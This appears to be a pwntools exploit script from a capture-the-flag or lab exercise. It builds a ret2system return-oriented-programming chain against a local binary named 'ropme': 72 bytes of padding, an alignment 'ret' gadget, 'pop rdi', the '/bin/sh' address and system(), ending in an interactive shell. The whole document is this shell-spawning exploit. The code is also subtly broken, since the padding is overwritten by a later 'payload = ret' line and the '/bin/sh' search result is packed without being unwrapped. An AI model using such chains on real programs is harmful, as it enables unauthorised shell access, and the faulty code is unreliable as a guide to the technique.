
context.binary = exe = ELF('./ropme')

#creating offset
offset = 72    #again 64 bytes for data and 8 bytes for rbp
payload = b'A'*(72)

#find the proper gadget
rop = ROP(exe)
pop = p64(rop.find_gadget(["pop rdi ; ret"])[0])
ret = p64(rop.find_gadget(["ret"])[0])

payload = ret    #needed for alligning
payload += pop

#pushing the "/bin/sh" string and padding
sh = exe.search(b'/bin/sh')
payload += p64(sh)

#finding the system function
system = p64(exe.symbols['system']) # or exe.plt['system']
payload+=system

#starting 
p = process('./ropme')
p.recvuntil(b"Inserisci i dati:")
p.sendline(payload)

#theoretically we are in /bin/sh now, so we have to be in interactive mode
p.interactive()
